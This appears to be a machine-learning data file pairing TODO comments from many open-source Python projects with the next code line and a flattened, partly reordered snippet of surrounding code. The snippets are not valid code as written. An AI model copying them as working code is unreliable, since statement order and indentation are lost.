# todo: should use response.json instead </s> assert isinstance(response.html, str)	MultipleRequestSpider urls = [f'https://httpbin.org/get?p={page}' for page in range(4)] async for response in self.multiple_request(urls, is_gather=True):
# todo: add metadata support when it is merged from develop </s> result["jid"] = data[0]	_build_dict Rebuild dict result = {} result["tgt_type"] = data[1] result["cmd"] = data[2]
""" todo: documentation </s> configurationsettings = type(self).configurationsettings	_prepare def _prepare(self, argv, input_file): argv = argv[2:] return ConfigurationSettings, argv, self.generate, 'ANY'
# todo : factorize this in utils/packages.py ? </s> for package in critical_packages:	tools_upgrade if not failure and noncritical_packages_upgradable: logger.info("Upgrading 'regular' (non-yunohost-related) packages ...") check_output("apt-mark hold %s" % package) held_packages = check_output("apt-mark showhold").split("\n")
# todo(vmiura): parse these in a more readable way. </s> l = l.strip()	Main if len(l) >= 1 and l[0] == '#': continue toks = l.split('\t') samp_command = toks[0]
# todo: remove when signals land </s> unit.store.data_tool.updater.update()	test_data_tp_checks unit.target = "<foo></bar>;" unit.save() tp0.data_tool.update() checks = _calculate_checks(qc_qs.all())
# todo: maybe the output dataplaceholders should be replaced too </s> for output in node.outputs:	_replace_step for node in new_step._nodes: node.step = new_step output._step = new_step if inspect.ismethod(node.compute_func):
# todo: require an api key on the basic auth header </s> try:	handle_finish @app.route('/api/work_queue/<string:queue_name>/finish', methods=['POST']) def handle_finish(queue_name): finish( queue_name,
# todo: this one doesn't work quite well, handle it </s> ast.fix_missing_locations(tree)	_compile_func def _compile_func(): code = compile(tree, func_file(func), 'single') exec code in func.__globals__, context
# todo: find a better way to enforce this. </s> else:	_translate_sext elif oprnd1.size < oprnd3.size: expr = (op1_var == smtlibv2.SEXTEND(op1_var, op3_var)) raise Exception("Invalid operand size: %d" % str(oprnd3)) rv = [expr]
# todo: a better solution might be to use locking in this code </s> limit=1,	get_by_domain_and_type include_docs=True, reduce=False,
# todo: add theano function. </s> raise notimplementederror()	extract_conv2d_patches backend = K.backend() if backend == "theano": elif backend == "tensorflow": import tensorflow
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
#todo : what if multiple projects are selected ? </s> p = pid[0]	on_delete_task if not tid : pid, t = self.get_selected_task() self.projects[p].get_task else :
# todo addding a assertrvline to test reversed selections would make calls to assertselection() obsolete in this test  # noqa: e501 </s> self.assertselection((14, 12), 'selection should be reversed')	test_if_forward_vline_and_target_is_before_selection_it_should_reverse_selection_and_extend_backward self.feed('l_%') self.assertVline(start)
# todo: think of something more sensible to do than sum(). on one </s> return sum(imap(msq, prediction, target))	SquaredError return msq(prediction, target) else:
# todo implement. </s> pass	SingleTrainer super(SingleTrainer, self).__init__(keras_model, features_col, label_col) def train(self, data):
## todo: add only the optimizations needed? </s> m2 = mode_blas_opt.including('canonicalize')	cmp assert len(topo)==2 f(av,bv,cv) f = theano.function([a,b,c],0.1*c * 0.2*T.dot(a,b),mode=m2) topo = f.maker.env.toposort()
# todo: copy icons into directory </s> return path	_make_native_kernel_dir }, f, indent=1)
# todo this paragraph is necessary, but not sure it works. </s> context = self._user_context.get_context()	get_completions i = imports.Importer(self._evaluator, imp_names, module, level) completion_names = i.completion_names(self._evaluator, only_modules) if not next(context).startswith('.'):  # skip the path if next(context) == 'from':
# todo (bev) exception or log? </s> pass	figure session = session() if not isinstance(session, Session): session.figure(**kwargs)
# todo: fix the fact the we have more keys in settings.yaml </s> src = "/test_dir/tests/test_data/settings_old"	test_settingsfile_migration_extension def test_settingsfile_migration_extension(tmpdir: pathlib.Path): dst = os.path.join(tmpdir, "settings") shutil.copyfile(src, dst)
# todo: deprecation 3.1 </s> @deprecated("deprecated. use log_cosh instead")	logcosh def logcosh(x): return log_cosh(x)
except exception:  # todo - which exceptions? </s> self.fail("treecluster failed to accept matrix data1")	test_matrix_parse try: treecluster(data1) try: treecluster(data2)
#todo same issue with batch_size </s> if len(self.inputs) == 0:	width def width(self): raise ValidationException("gan.width() requested but no inputs provided") print("----", self.ops.shape(self.inputs[0]))
# todo: /data/local/tmp might not be execuable and atx-agent can be somewhere else </s> device.shell_output("/data/local/tmp/atx-agent", "server", "-d")	connect_usb warnings.warn("backend atx-agent is not alive, start again ...", RuntimeWarning) deadline = time.time() + 3 while time.time() < deadline:
# todo consider launching a second search if results.total_tracks() </s> playlist = playlist(tracks=[	callback def callback(results, userdata=None): SpotifyTranslator.to_mopidy_track(t) for t in results.tracks()])
# todo: remove this test as soon as all old test methods are migrated </s> from sage.misc.sage_unittest import testsuite	test_old_testsuite def test_old_testsuite(self, backend: GenericBackend): TestSuite(backend).run(verbose=True, raise_on_failure=True, skip=("_test_pickling","_test_solve","_test_solve_trac_18572"))
# todo: explicitly commit files by name </s> youngest_ancestor = os.path.commonprefix(files)	add raise IOError("[BZR] add in '%s' failed: %s" \ % (self.location_abs, error)) return output + type(self)(youngest_ancestor).commit(message, author)
# todo: kernels need some sort of structured form </s> def r_2_log_r_2_kernel_derivative(r):	r_2_log_r_2_kernel_derivative Derivative of the radial basis function for TPS. mask = r == 0
#todo this method is so weird, find a unused address to inject code not the base address </s> code = ""	get_dbg_brk_linux64 def get_dbg_brk_linux64(): Return the current brk value in the debugged process (only x86_64 Linux) code += 'H\xc7\xc0\x0c\x00\x00\x00' #mov rax, sys_brk ; 12 code += 'H1\xff' #xor rdi, rdi
# todo: this is an important operation that should be controlled </s> return "python"	_python_cmd def _python_cmd(_project_op):
# todo: implement the shit herein instead of collectionrepo </s> return self.repo.get_collection(self.branch)	CollectionRepoBranchBackend return self.repo.get_handles(self.branch) def get_collection(self): def commit_collection(self, collection, msg): self.repo.commit_collection(collection, self.branch, msg)
# todo: remove "--feature=2020-resolver" when pip 20.3 is released </s> run_pipx_cli(	install_package if not package_name: package_name = package ["install", package, "--verbose", "--pip-args='--use-feature=2020-resolver'"] )
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: self._line_structures is a work-around and this needs </s> self._line_structures[1] = ('logline', log_line)	_ParseCommentRecord for member in comment[7:].split(): log_line += self._LOG_LINE_STRUCTURES.get(member, self.URI)
# todo consolidate with other drivers </s> self._lock.release()	_pump self._sync_dispatch_player_event('on_source_group_eos')
# todo(cdent): make this something other than a stub </s> def application(environ, start_response):	application start_response('500 Internal Server Error', [ ('Content-Type', 'text/plain; charset=UTF-8')])
# todo: comment this </s> dirname = os.path.join(self.site_root, *path_parts)	search_dir Return (template_name, type_extension, engine) if a match is found or None if not os.path.isdir(dirname): return
# todo: enable this.  this is more like cpython.  note that i worked </s> obj_name = '<genexpr>'	GenExprCodeGenerator gLambdaCount += 1 else: isLambda = 1 FunctionMixin.__init__(self, gexp, obj_name, isLambda, class_name, mod)
# todo: set numpy setflags </s> return self._data[self._mask_domain]	data_ro_domain A read-only view of the domain data values. Elements are stored in row-major format.
#todo: fix this better </s> if options.get("randomize") in ["all", "suites"] and \	main if suite_names: for suite_group in suite_names: "suitesfrom" in pabot_args: random.shuffle(suite_group)
#todo - code itself tolerates ambiguous bases (as nan). </s> if not isinstance(self.alphabet, iupac.iupacunambiguousdna):	scanPWM - the sequence can only be a DNA sequence - the search is performed only on one strand raise ValueError("PSSM has wrong alphabet: %s - Use only with DNA motifs" \ % self.alphabet)
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo support subvars (@sub.var1) </s> dump_data = base64.b64encode(json.dumps(self.dump()).encode()).decode()	compile_embedded def compile_embedded(self): return f"?{{{self.type_name}:{dump_data}:embedded}}"
# todo(b/179510447): align these parameters with schulman 17. </s> std_kernel_initializer_scale = 0.1	std_layers def std_layers(): std_bias_initializer_value = np.log(np.exp(0.35) - 1) return tf.keras.layers.Dense(
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# # todo: </s> return os.path.join('twitter', item_date, item_id) + '.gz'	get_item_id item_id = str(self.json_item['meta']['twitter:tweet_id'])
# todo: get this from cache. </s> now = datetime.datetime.now()	base def base(request): notifications = models.Notification.objects.filter( start_date__lte=now, end_date__gte=now)
# todo threading </s> to_parquet(chunk, conn, bucket,	to_sql for key, val in zip(partitions, list(keys))]) for chunk in get_chunks(group, chunksize): '{0}/{1}'.format(key_prefix, partition_prefix), compression=compression,
# todo use smart_open again when https://github.com/rare-technologies/smart_open/issues/207 will be fixed </s> with open(self.file_name, 'rb') as f:	load_binary_data def load_binary_data(self, encoding='utf8'): self.load_model_params(f) self.load_dict(f, encoding=encoding)
# todo: comment as to why this is </s> context = none	remove assert self.__open, "The InformationStore must be open." if context == self.identifier: cspo, cpos, cosp = self.__indicies index, prefix, to_key, from_key = self.__lookup((subject, predicate, object), context)
# todo: add logging to indicate the failure </s> await raw_conn.close()	Swarm secured_conn = await self.upgrader.upgrade_security(raw_conn, peer_id, True) except SecurityUpgradeFailure as error: raise SwarmException( f"fail to upgrade the connection to a secured connection from {peer_id}"
# todo: add invocation wrapper #1353 </s> globalloggersettings.stop_console_logging()	test_bob_retrieves_twice_via_cli log.info("Patching make_cli_character with substitute_bob") actions.make_cli_character = substitute_bob retrieve_response = click_runner.invoke(nucypher_cli, retrieve_args, catch_exceptions=False, env=envvars) GlobalLoggerSettings.start_console_logging()
# todo: make this work for sql </s> create_actions = filter(lambda a: a.action_type == case_action_create, case.actions)	case_details return HttpResponseRedirect(CaseListReport.get_url(domain=domain)) if not should_use_sql_backend(domain): if not create_actions: messages.error(request, _(
# todo: ensure collisions can't happen by verifying the config_prefix is empty </s> random_prefix = ''.join(	add_process_layer def add_process_layer(self, context, config_prefix = None, preferred_name = None): if config_prefix is None: random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(8)) config_prefix = interfaces.configuration.path_join("temporary", "_" + random_prefix)
raise notimplementederror # the below does most probably not work anymore todo </s> if self._ui.confirm("are you sure you want to delete your work on %s?"%self._ticket_repr(ticketnum), default=false):	abandon TESTS:: TODO self.git.abandon(ticketnum)
"bpm"        : float(self.bpm), # todo: serialise timevar etc </s> "beat"       : (self.beat.numerator, self.beat.denominator),	get_sync_info "sync" : { "start_time" : (self.start_time.numerator, self.start_time.denominator), "time"       : (self.time.numerator, self.time.denominator) }
# todo subject.cn from cert? </s> self.assert_hashes_for_signable(info, [-5, -3, -2, -1])	check_bundle assert 'Sealed Resources' in info
todo: factorize once #1457 is merged. </s> returns: longitude [deg east], latitude [deg north] and altitude [m]	_get_satpos def _get_satpos(self): Evaluate orbit polynomials at the start time of the scan. if self.satpos is None: a = self.mda['projection_parameters']['a']
# todo: find the id that's suitable for this extruder </s> pass	addExtruderStackForSingleExtrusionMachine quality_id = "default" if machine.quality.getId() not in ("empty", "empty_quality"): else: quality_id = "empty_quality"
stats_to_calculate = ['mean', 'std', 'min', 'max']  # todo: get input from user </s> percentiles_to_calculate = range(0, 100, 1)  # todo: get input from user	calculate_other_metric_stats def calculate_other_metric_stats(self): headers = CONSTANTS.SUBMETRIC_HEADER + ',mean,std,p50,p75,p90,p95,p99,min,max\n'  # TODO: This will be built from user input later on metric_stats_csv_file = self.get_stats_csv()
#todo: detect the size of gpu pointeur and c int. </s> int_size = 8	local_gpu_huge_add_or_mul The CUDA c compiler limits the number of arguments to 256 bytes' worth or something. if isinstance(node.op, GpuElemwise) and node.op.scalar_op in (scal.add, scal.mul): ptr_size = 8 argument_limit = 256  # 16 bytes are used for block and thread coords etc.
pass  # todo </s> self._current_command = []	__init__ self._device = None
# todo: this scrolling is lame and centers text :/ </s> view.show(size)	_display view.insert(ed, size, str(self)) view.set_read_only(True)
# todo: add and store preprocessing errors. </s> logging.error('unable to decode username.')	_ParseFileData username = row[0].decode('utf-8') except UnicodeDecodeError: continue try:
# todo test this logic with effect </s> for root, dirs, files in os.walk(rpm_directory.path):	update_repo check_call([b'createrepo', b'--update', os.path.join(rpm_directory.path, target_key)]) for name in files: source_path = os.path.join(root, name)
# todo this might have the same bug the r package had </s> ind = np.where(d == np.min(d))[0]	roc_curve print('Area under ROC curve (AUC): %0.2f' % area) d = (fpr - 0) ** 2 + (tpr - 1) ** 2 best_tpr = tpr[ind] best_fpr = fpr[ind]
# todo: uris as bytes </s> uris = []	parse_m3u - m3u files are latin-1. - This function does not bother with Extended M3U directives. try: with open(file_path) as m3u:
# todo(ericbidelman): support more than one filter. </s> if filterby:	get_all if feature_list is None or update_cache: query = Feature.all().order(order) query.filter(filterby[0], filterby[1]) features = query.fetch(limit)
# todo caching? prebuilt mode table? </s> return [p for p in getplugins(_imodedef, plugins) if p.available]	get_modes def get_modes():
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# temporary for testing. todo: remove </s> if randint(0, 100) == 0:	add_sell_to_events self.general_trade_profit_loss += general_profit_loss self.taxable_trade_profit_loss += taxable_profit_loss row = len(self.csvexporter.all_events_csv) + 2 self.temp_list.append((row, taxable_profit_loss))
# todo: backend tensorflow </s> if backend_name == "tensorflow.compat.v1":	state_dict def state_dict(self): destination = OrderedDict() variables_names = [v.name for v in tf.global_variables()]
#todo: set secure automatically if being accessed by https. </s> self.send_header("set-cookie",	_do_cookieguard_set_cookie bad_cookie is True if the cookie was set but is wrong. self.send_response(307, "Temporary Redirect") "%s=%s; SameSite=Strict; HttpOnly; path=/" % (self._pox_cookieguard_cookie_name,
# todo: description </s> return _check_global(global_params, result_dict, 'snooping', 'snooping', 'turn it on to prevent spoofing attack')	snooping_global def snooping_global(global_params, result_dict):
# todo: implement this (maybe change answer type) </s> elif subtype == 2:	build_dataset if subtype == 0: elif subtype == 1: A = objects[color1][1] B = objects[color2][1]
# todo only do these thing if status is true </s> elif endpoint.state == 'unknown':	process status = Actions( endpoint, self.s.sdnc).mirror_endpoint() if self.s.investigations < self.controller['max_concurrent_reinvestigations']: self.s.investigations += 1
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(133) # 10000101	SetMotorCW def SetMotorCW(self):
# todo: can this be optimized to avoid duplicating the anchors? </s> anchors = np.broadcast_to(anchors, (self.config.batch_size,) + anchors.shape)	detect "Images must have the same size unless IMAGE_RESIZE_MODE is 'square'" anchors = self.get_anchors(image_shape) molded_images, image_metas, windows = self.mold_inputs(images) if verbose:
# todo: all the expand stuff! </s> view.textcursor().inserttext(text)	trigger text = template.text(name) if text:
# todo: send back error </s> raise oserror(msg)	_load_directory msg = u"directory doesn't exist: %s" % file_name self._logger.warn(u"[READ %s:%s] %s", ip, port, msg) elif not os.path.isdir(dir_path): msg = u"not a directory: %s" % file_name
# todo yield </s> raise runtimeerror("sibling '{0}' already exists with conflicting"	__call__ conflicting.append(repo_name) if not force and conflicting: " settings for {1} dataset(s). {2}".format( name, len(conflicting), conflicting))
# todo: convert non uris to file uris. </s> cp = configparser.rawconfigparser()	parse_pls def parse_pls(data): cp.readfp(data) for i in xrange(1, cp.getint('playlist', 'numberofentries')):
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
assert returned == 0  # todo return different value? </s> out, err = capsys.readouterr()	test_help_no_dodo_file def test_help_no_dodo_file(self, capsys): returned = cmd_main(["help", "-f", "no_dodo", "wrong_name"]) assert "doit list" in out
# todo: should this be filtered? </s> return self.buf.get_text(line_start, line_end, false)	__getitem__ if not line_end.ends_line(): line_end.forward_to_line_end()
# todo: kill this debug print. </s> print msgs	test_js_sandboxer_with_app_context failures = [log['failure'].value for log in lc.errors] msgs = lc.messages() self.assertEqual(failures, []) self.assertEqual(status, 0)
# todo: css pointer-events have been set to none for the nested anchor tag </s> return dcc.link(	Link @component def Link(text, href='', **kwargs): children=html.A(text, href=href), href=href,
# todo: rate should not have to be inversed </s> rate = 1 / math.exp(-graph[start][end])	calculate_profit_ratio_for_path start = path[i] end = path[i + 1] money *= rate return money
# todo: consider using eafp here instead. </s> template = partials.get(name)	load_partial def load_partial(name): if template is None: raise TemplateNotFoundError("Name %s not found in partials: %s" %
# todo : move this control elsewhere </s> if msg_type is reserved_0 or msg_type is reserved_15:	MQTTFixedHeader flags = int1 & 0x0f remain_length = yield from decode_remaining_length() raise MQTTException("Usage of control packet type %s is forbidden" % msg_type) return cls(msg_type, flags, remain_length)
## todo : log error </s> (title, body) = _create_configure_doctype_form(doctype=doctype, user_msg=user_msg)	_delete_submission_from_doctype else: user_msg.append("""Unable to successfully delete the "%s" Submission from the "%s" Document Type""" % (action, doctype)) return (title, body)
# todo: do something clever with originselectionrange and targetrange. </s> file_path = uri_to_filename(response["targeturi"])	process_response def process_response(response: dict) -> 'Tuple[str, str, Tuple[int, int]]': if "targetUri" in response: start = Point.from_lsp(response["targetSelectionRange"]["start"]) else:
# end todo </s> _build_make_spec_commom(make_spec_parser)	add_make_spec_parser make_spec_parser.add_argument('--app-version', help=argparse.SUPPRESS) make_spec_parser.add_argument('-k', '--keep', help=argparse.SUPPRESS)
"size": 50  # todo: support pagination. </s> }	search }, "fields": ["title", "project", "version", "path"], if project_slug: project = get_object_or_404(Project, slug=project_slug)
pass  # todo - should this do something </s> press "join domain" on users tab	on_btjoindomain_clicked def on_btjoindomain_clicked(self, widget, data=None):
#todo: add deployment/replicaset? </s> status = self.pod_phase_to_status.get(phase, self.kube_check.unknown)	kube_pod_status_phase else: tags.append('{}:{}'.format(label.name, label.value)) self.service_check(check_basename + phase, status, tags=tags)
# todo set only zero order </s> vals = nm.repeat([fun], nods.shape[0] * dpn)	set_volume_dofs nods = nm.unique(nm.hstack(aux)) if nm.isscalar(fun): elif isinstance(fun, nm.ndarray): assert_(len(fun) == dpn)
# todo: not fool proof yet, but captures the most obvious cases. </s> card_type_name_safe = card_type_name.encode('utf8').replace(" ", "_")	load card_type_name = card_type_id.rsplit(".", 1)[1] card_type_name.replace("ALIAS_", "") C = type(card_type_name_safe, (parent_instance.__class__, ), {"name": card_type_name,
# todo: self.assertfalse(prop.is_valid(np.bool8(false))) </s> self.asserttrue(prop.is_valid(np.int8(0)))	test_Complex try: import numpy as np self.assertTrue(prop.is_valid(np.int8(1))) self.assertTrue(prop.is_valid(np.int16(0)))
# todo: investigate why this fails </s> return	test_field_renaming def test_field_renaming(self): value = self.field_values[0] Model = self.model_def.model_class()
#todo: check if/where this is used; if not used externally - remove </s> self.marker_detector.inverted_markers = value	inverted_markers @inverted_markers.setter def inverted_markers(self, value: bool):
# todo(frostig): finalize api. for now, return the underlying </s> if self.computation.is_trivial():	_xla_executable def _xla_executable(self): raise ValueError('A trivial computation has no executable') return self.computation.xla_executable
# todo: in the future you can also add the possibility to synchronize from a chosen profile </s> is_account_owner = g.local_db.get_profile_config('isaccountowner', false)	initial_mylist_sync def initial_mylist_sync(self, pathitems): from resources.lib.cache import CACHE_COMMON if not is_account_owner: ui.show_ok_dialog('Netflix', common.get_local_string(30223))
# todo: wrap backend call in error handling. </s> if not backend or backend.playback.pause().get():	pause def pause(self): backend = self._get_backend(self.get_current_tl_track()) self.set_state(PlaybackState.PAUSED) self._trigger_track_playback_paused()
# todo g.ind_edges = sub2ind(size(g.w), g.v_in, g.v_out) </s> g.v_in = v_i	adj2vec v_i, v_j = (sparse.tril(G.W)).nonzero() weights = G.W[v_i, v_j] G.v_out = v_j G.weights = weights
loader = imageloader(32) #todo crop=true? </s> x, y = loader.load(fixture_path('images'), width=4, height=4)	test_load_fixture_single_count def test_load_fixture_single_count(self): with self.test_session(): self.assertEqual(loader.file_count, 1)
# todo: improve this with a better resampling algorithm </s> if map_func is none:	resample def resample(self, num_samples, map_func=None, *args, **kwargs): self._check_finalized() map_func = lambda x: x return Empirical(values=[map_func(self.sample()) for i in range(num_samples)], *args, **kwargs)
# todo: enable specificity beyond hostname (e.g. include scheme, port) </s> tuf_configuration = \	make_tuf_updater def make_tuf_updater( url ): parsed_url = urlparse.urlparse( url ) TUFUpdater._tuf_configurations.get( parsed_url.hostname ) if tuf_configuration is None:
#todo(wuzewu): version sort method </s> model_version_list = sorted(model_version_list)	get_model_url self.model_list_file['version'][index] for index in model_index_list ] if not version: if not model_version_list:
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
# todo: why with bookkeeping=false? </s> _postfetch(	_emit_update_statements c = cached_connections[connection].\ execute(statement, params) mapper, uowtransaction,
spack.do_checksum = false        # todo: remove this global. </s> print "output to:", args.outputdir	testinstall tty.die("The -j option must be a positive integer!") if args.no_checksum: specs = spack.cmd.parse_specs(args.packages, concretize=True) try:
# todo: using variables (aka xccdf values) in ocil content </s> if rule.ocil:	export_ocil_to_file boolean_question = ET.SubElement( questions, "boolean_question", id=rule.id_ + "_question") ocil_without_tags = re.sub(r"</?[^>]+>", "", rule.ocil) else:
status = 'published'  # todo: find a way for draft posts </s> yield (post_title, content, slugify(post_title), post_creadt, author,	dc2fields post_format = "html" kind = 'article'  # TODO: Recognise pages categories, tags, status, kind, post_format)
except typeerror as e:          #todo: generalise for all api methods </s> raise exception(str(e))	create_method transaction_args, common_args, private_key_wif = split_params(**kwargs) return compose_transaction(db, name=transaction, params=transaction_args, **common_args)
# todo add verbose output </s> self._timeout = new_timeout	timeout @timeout.setter def timeout(self, new_timeout):
# todo: create a new, better, doc interface to remove it </s> plugin_commands = itertools.chain(	doc This attribute is now generated on the fly from the registered list of commands and nickname commands. self._rules_manager.get_all_commands(), self._rules_manager.get_all_nick_commands()
# todo(user): remove after 184 is out. </s> def testmultipleshards183compat(self):	testMultipleShards183Compat entity_count = 1000 for _ in range(entity_count):
# todo: clean this api when tensorflow requirement is updated to >=2.6. </s> if compat.tf_supports("data.dataset.group_by_window"):	_group_by_window def _group_by_window(*args, **kwargs): return lambda dataset: dataset.group_by_window(*args, **kwargs) else:
# todo(b/80125832): enable nccl in tests </s> self._test_variable_updates(params, var_updates=('replicated',))	testVariousAllReduceSpecs params = params._replace(all_reduce_spec='psgpu')
# todo: should assert that the tag values are all strings </s> if values not in self.counts:	inc (len(self.keys)) ) self.counts[values] = 1 else:
# todo: confirm necessity of this session clearing and lay out mechanics. </s> tuf.download._sessions = {}	test_https_connection try: os.environ['REQUESTS_CA_BUNDLE'] = bad_cert_fname logger.info('Trying HTTPS download of target file: ' + bad_https_url) with self.assertRaises(requests.exceptions.SSLError):
# todo return, catch exception in main() </s> raise e	create_ghidra_script except Exception as e:
# todo: match line and arrowbox </s> assert matches	test_asy_arrowbox inner_asy = extract_asy_body(asy) matches = re.match(r'^draw\(.*\)', inner_asy)
# todo: legacy behavior, should remove after new case processing </s> if xform._id not in case_doc.xform_ids:	get_or_update_cases case_doc = _get_or_update_model(case_block, xform, case_db) if case_doc: case_doc.xform_ids.append(xform.get_id) case_db.set(case_doc.case_id, case_doc)
# todo: should be none for undef instead?  or ''? </s> return 0	ArithEvaluator e_die('Index out of bounds') else: elif isinstance(lhs, dict): try:
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_simplest pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	reboot def reboot(self, instance, network_info):
#@todo: replace lambdas </s> data = zip(queue.keys(), queue.values())	collector else: pyfile["icon"] = "status_downloading.png" data.sort(key=get_sort_key) for id, value in data:
# todo !!! remove all this </s> global schema	__init_primary_key def __init_primary_key(self, columns): if schema is None: from sqlalchemy import schema
# todo indexerror? </s> raise typeerror('unsupported index item type: %r' % dim_sel)	normalize_dim_selection raise TypeError('unsupported index item type: %r' % dim_sel) else:
# todo: remove </s> return []	get_sub_commads def get_sub_commads(self):
# todo: fill with last value. </s> pass	__init__ spline_degree = (spline_degree, ) if len(spline_degree) < dim: self.in_features = in_features self.out_features = out_features
# todo: handle output diffing with plugins? i.e. image diff, svg diff, json diff, etc. </s> from nbdime import diff	diff_single_cells def diff_single_cells(a, b): return diff(a, b)
# todo: log exception </s> conf = config[modname]	_start_module_threads conf.update(config[modname]) except Exception as e: if '_load_default' in conf: del conf['_load_default']
# todo: currently the functional tests only pass when run in a specific </s> return {'admin_interface':	_get_test_module_dict tests, test_paths = [], [] if test_type == 'functional': os.path.join( ABS_MODULE_DIR_PATH,
# todo: remove this global variable hacks after refactoring process. </s> self.old_data_path = data_utils.data_path	setUp def setUp(self): data_utils.data_path = 'sourcedr/test/map/data.json'
# todo: should wait for the end of the ongoing test case, and stop gracefully netmon and procmon </s> def exit_abruptly(signal_recv, frame_recv):	server_init self.total_mutant_index = 0 self.total_num_mutations = self.num_mutations() Save current settings (just in case) and exit self.export_file()
# todo: in 0.6.0 change this to "disabled": false </s> "enabled": true,	test_server_mode "duplicate_cn": True, "engine": "rsax", "fast_io": True, "fragment": 0,
# todo: think how to resolve landscape.io warning: </s> return windll.user32.callnexthookex(self.mouse_id, code, event_code, kb_data_ptr)	mouse_low_level_handler self.handler(event) finally:
# todo: deprecated - remove in version 0.10 </s> if isinstance(training_trackers, string_types):	train_online "When using online learning, you need to specify " "an interpreter for the agent to use.") logger.warning("Passing a file name to `agent.train_online(...)` " "is deprecated. Rather load the data with "
# todo better check would be if the node is linked to the output and actually used </s> return utils_node.has_nodes(node_tree, "luxcorenodetexpointiness", true)	uses_pointiness def uses_pointiness(node_tree):
# todo: kill this after dictionaries build correctly </s> popt = self._forced_parse(parser, opt)	_distributed_train_model opt['dict_file'] = os.path.join(tmpdir, 'model.dict') parser = mp_train.setup_args() parser = build_dict.setup_args() build_dict.build_dict(popt)
# todo: sessions and not only dates/days should be considered </s> return true	_barisover_seconds bartm = self.data.datetime.time(index) if bardt > dt: second = tm.hour * 3600 + tm.minute * 60 + tm.second barsecond = bartm.hour * 3600 + bartm.minute * 60 + bartm.second
# todo: fix this! </s> pacman_options["downloadonly"] = true	install_packages downloaded_ok = [] pacman_options = {} for package_type in self.packages: logging.debug(_("Downloading packages from '%s' group...") % package_type)
# todo: validate </s> logger.error("caught test exception", exc_info=1)	test_manaul_exec_info_logging except Exception:
# todo: supports blocking queries and all consistency modes </s> params = {}	nodes Returns the nodes known about in the *dc* datacenter. *dc* defaults to the current datacenter of this agent. if dc: params['dc'] = dc
# todo: parse flags, error checking, etc. </s> d = argv[1]	Cd def Cd(self, argv): os.chdir(d) self.mem.SetGlobalString(ast.LeftVar('PWD'), d)
# todo: rate should not have to be inversed </s> rate = 1 / math.exp(-graph[start][end])	print_profit_opportunity_for_path start = path[i] end = path[i + 1] money *= rate print("%(start)s to %(end)s at %(rate)f = %(money)f" % {"start": start, "end": end, "rate": rate,
# todo: keep this as a dict through the whole path to simplify this code </s> for (k,v) in inject.iteritems():	_add_setup_vars if type(args) == dict: is_dict = True if not k.startswith('facter_') and not k.startswith('ohai_'): if not is_dict:
# todo: do properly with .predict() </s> if basis == 'linear':	plot_regressions ax.set_ylabel('y') x0 = np.linspace(-10, 10, 40) y0 = alpha_in + x0 * beta_in elif basis == 'poly':
# todo: @sbharadwajj implement and test </s> raise notimplementederror	get_unfolded_input def get_unfolded_input(self, module):
# todo(ddeja): those 2 options should be gathered from config. </s> self._sleep_time = 1	__init__ self._thread = None self.connection = self._connections.next() self._max_sleep_time = 512
#todo - add checks in case we don't have a well-formatted xmlns </s> r = re.search('{[a-za-z0-9_\-\.\/\:]*}', root.tag)	get_xmlns logging.debug("Parsing xml file successful") logging.debug("Find xmlns from " + root.tag) if r is None: logging.error( "NO NAMESPACE FOUND" )
# todo guard on system (provides_system_bus) </s> activated_ifaces = []	get_activated_interfaces :return: list of names of devices having active network connection :rtype: list(str) if not self.nm_available: log.debug("Activated interfaces can't be determined.")
# todo: - torch.abs(h_emb + r_emb - t_emb) </s> first_part = torch.mm(r_k, projected_head)	compute_scores :param projected_tail: :return: second_part = alpha_k * projected_tail score = - torch.sum(torch.abs(first_part - second_part))
if colorsorter._parent_csdl and colorsorter._parent_csdl.reentrant: ##### todo: use different flag </s> pos = colorsorter._transform_point(pos)	schedule_sphere print "bare_prim sphere:", ColorSorter._gl_name_stack[-1], \ color, pos, radius, ColorSorter._debug_transforms() ##### if drawing_globals.use_c_renderer and ColorSorter.sorting: if len(color) == 3:
# todo: this here always returns empty response. if/when we want to </s> args = []	mock_etherscan_balances_query output_types = get_abi_output_types(fn_abi) decoded_input = web3.codec.decode_abi(input_types, bytes.fromhex(data[10:])) result = '0x' + web3.codec.encode_abi(output_types, [args]).hex() response = f'{{"jsonrpc":"2.0","id":1,"result":"{result}"}}'
# todo: could cache the results of this for speed </s> existing = location.filter_by_type(domain, loc_type, parent)	get_by_name def get_by_name(loc_name, loc_type, parent): try: return [l for l in existing if l.name == loc_name][0]
# todo(stephenfin): use a helper </s> self.api.post_server_action(server['id'], {'migrate': none})	test_migrate_revert fake_drop_move_claim, ) self._wait_for_state_change(server, 'VERIFY_RESIZE') self.assertUsage(src_host, 1)
w, h = tiledsurface.n, tiledsurface.n # todo: support for other sizes </s> thumbnail_pixbuf = self.doc.model.save(filename, feedback_cb=self.gtk_main_tick, **options)	save_file x, y, w, h =  self.doc.model.get_bbox() if w == 0 and h == 0: except document.SaveLoadError, e: self.app.message_dialog(str(e),type=gtk.MESSAGE_ERROR)
